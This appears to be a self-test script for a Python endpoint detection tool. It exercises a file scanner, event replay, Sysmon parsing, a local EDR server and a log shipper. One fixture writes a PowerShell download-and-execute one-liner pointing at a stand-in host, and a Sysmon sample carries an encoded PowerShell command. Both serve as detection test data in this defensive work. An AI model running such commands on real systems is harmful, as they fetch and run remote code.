import tempfile
from pathlib import Path
import sys
import threading
import time
import urllib.request

PROJECT_ROOT_FOR_IMPORTS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT_FOR_IMPORTS))

from pyantiai.behavior import replay_jsonl
from pyantiai.cli import main
from pyantiai.edr_server import EdrStore, create_http_server
from pyantiai.ioc import IocStore
from pyantiai.logshipper import LogShipper
from pyantiai.paths import DEFAULT_IOC_DIR, DEFAULT_RULES_FILE, PROJECT_ROOT
from pyantiai.realtime import PollingRealtimeWatcher
from pyantiai.severity import decide
from pyantiai.static_scan import StaticScanner
from pyantiai.sysmon import convert_sysmon_event


def run():
    ioc = IocStore(DEFAULT_IOC_DIR)
    scanner = StaticScanner(ioc, DEFAULT_RULES_FILE)

    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "suspicious.ps1"
        path.write_text("IEX (New-Object Net.WebClient).DownloadString('http://malicious.test/a.ps1')\n", encoding="utf-8")
        result = scanner.scan_file(path, debug=True)
        detection = decide(path, result["signals"])
        assert detection["score"] >= 40
        assert any(item["category"] == "powershell_downloader" for item in result["signals"])

    replay = replay_jsonl(PROJECT_ROOT / "examples" / "events.jsonl", ioc)
    assert replay["detection"]["score"] >= 100
    assert any(item["category"] == "process_injection" for item in replay["signals"])

    sysmon_xml = """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <EventID>1</EventID>
        <EventRecordID>42</EventRecordID>
        <TimeCreated SystemTime="2026-01-01T10:00:00.0000000Z"/>
      </System>
      <EventData>
        <Data Name="ProcessId">1100</Data>
        <Data Name="ParentProcessId">1000</Data>
        <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
        <Data Name="CommandLine">powershell.exe -EncodedCommand SQBFAFgA</Data>
        <Data Name="Signature">Unknown</Data>
      </EventData>
    </Event>"""
    converted = convert_sysmon_event(sysmon_xml)
    assert converted[0]["type"] == "process.start"
    assert converted[0]["pid"] == 1100

    with tempfile.TemporaryDirectory() as tmp:
        store = EdrStore(Path(tmp) / "edr.sqlite")
        server = create_http_server("127.0.0.1", 0, store, api_key="test-key")
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        try:
            port = server.server_address[1]
            shipper = LogShipper(server_url=f"http://127.0.0.1:{port}", agent_id="selftest-agent", api_key="test-key")
            shipped = shipper.send({"type": "selftest.event", "detection": {"score": 10, "severity": "low", "action": "allow"}})
            assert shipped["sent"] is True
            assert store.count() == 1
            assert store.query(limit=1)[0]["agent_id"] == "selftest-agent"
            request = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/v1/agents",
                headers={"X-API-Key": "test-key"},
            )
            with urllib.request.urlopen(request, timeout=5) as response:
                agents_body = response.read().decode("utf-8")
            assert "selftest-agent" in agents_body
            with urllib.request.urlopen(f"http://127.0.0.1:{port}/dashboard", timeout=5) as response:
                dashboard_body = response.read().decode("utf-8")
            assert "AntiAiVi EDR Console" in dashboard_body
            assert main([
                "scan",
                str(PROJECT_ROOT / "examples" / "events.jsonl"),
                "--server-url",
                f"http://127.0.0.1:{port}",
                "--agent-id",
                "cli-selftest",
                "--api-key",
                "test-key",
            ]) == 0
            assert store.count() == 2
            watch_dir = Path(tmp) / "watch"
            watch_dir.mkdir()
            watcher = PollingRealtimeWatcher(
                [watch_dir],
                scan_file=lambda path: {"file": str(path), "signals": [], "detection": {"score": 0}},
                on_result=lambda _result: None,
                interval=0.05,
                heartbeat_interval=0.05,
                on_heartbeat=lambda event: shipper.send(event),
            )
            watcher_thread = threading.Thread(target=watcher.start, daemon=True)
            watcher_thread.start()
            try:
                wait_for(
                    lambda: any(
                        agent["agent_id"] == "selftest-agent" and agent["last_heartbeat"] is not None
                        for agent in store.agents()
                    ),
                    timeout=3,
                )
                assert store.count() == 2
                agent = next(item for item in store.agents() if item["agent_id"] == "selftest-agent")
                assert agent["status"] == "green"
            finally:
                watcher.stop()
                watcher_thread.join(timeout=2)
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=2)

    assert main(["scan", str(PROJECT_ROOT / "examples" / "events.jsonl")]) == 0
    print("Python self-test passed.")


def wait_for(predicate, timeout=3):
    started = time.time()
    while time.time() - started < timeout:
        if predicate():
            return
        time.sleep(0.05)
    raise AssertionError("Timed out waiting for condition")


if __name__ == "__main__":
    run()
